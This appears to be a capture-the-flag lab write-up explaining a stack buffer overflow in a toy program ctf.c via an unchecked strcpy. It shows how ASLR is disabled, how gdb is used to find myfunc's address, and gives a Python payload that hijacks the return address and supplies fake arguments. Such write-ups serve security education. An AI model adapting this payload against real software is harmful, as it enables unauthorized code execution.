# 1. Inject code to delete file
# 2. Conduct attack on ctf.c

![Picture about ctf.c](Chapter-2/imgs/ctf.png)

The vulnerability is strcpy(buf, s) at line 31 because s can have a longer length than buf.

First, we have to set up system `sudo sysctl -w kernel.randomize_va_space=0` so that system doesn't random variable's address

Normal stack frame of the program:

![Picture about ctf.c stack frame](Chapter-2/imgs/ctf-Stack-Frame-normal.png)

If we want the program to run the function myfunc(), we need to assign its address to the return address of vuln().

Using gdb and `disas myfunc` we know `0x0804851b` is its address:

![Picture about using gdb myfunc()](Chapter-2/imgs/ctf-gdb.png)

Stack frame of myfunc():

![Picture about myfunc stack frame](Chapter-2/imgs/ctf-Stack-Frame-myfunc.png)

However, because we perform buffer overflow to execute the myfunc() function, we are missing 2 arguments p and q:

![Picture about ctf.c stack frame buffer](Chapter-2/imgs/ctf-Stack-Frame-buffer.png)

Based on the stack frame, ebp of main() must contain the value of p and ret addr of main() must contain the value of q

`./ctf.out $(python -c "print(104*'a' + '\x1b\x85\x04\x08' + 4*'a' + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")`
- `104*'a'` assigns arbitrary values ​​to buf and ebp of vuln()
- `\x1b\x85\x04\x08` assigns the address of myfunc() to the ret addr of vuln()
- `4*'a'` assigns arbitrary value to s of vuln()
- `\x11\x12\x08\x04` assigns the value p to the ebp of main()
- `\x62\x42\x64\x44` assigns the value q to the ret addr of main()

![Picture about result](Chapter-2/imgs/ctf-result.png)
